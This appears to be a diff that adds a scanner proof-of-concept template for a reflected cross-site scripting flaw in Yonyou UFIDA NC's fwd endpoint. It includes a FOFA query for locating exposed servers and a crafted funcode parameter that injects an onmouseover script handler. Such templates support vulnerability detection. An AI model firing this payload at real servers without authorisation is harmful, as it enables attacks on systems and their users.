@@ -1,0 +1,18 @@
+id: poc-yaml-yonyou-ufida-nc-fwd-xss
+info:
+  name: 用友NC fwd XSS漏洞
+  severity: high
+  tags:
+  - xss
+  finger: ufida-nc
+  fofa: app="用友-UFIDA-NC"
+requests:
+- method: GET
+  path: /index.jsp
+  expression: status_code == 200 && contains(body,"YONYOU NC")
+- method: GET
+  path: /portal/pt/nc5x/fwd?pageId=login&funcode=1%27);%22%20onmouseover=%22alert(`xss`)%22%20x=%22&systemcode=1111
+  expression: status_code == 200 && contains(headers,":server1") && contains(body,"onload=\"openNCNode('1');\"
+    onmouseover=\"alert(`xss`)\" x=\"','1111'") && contains(body,"/portal/html/frame/nc5xNode.js")
+variables: {}
+transport: http
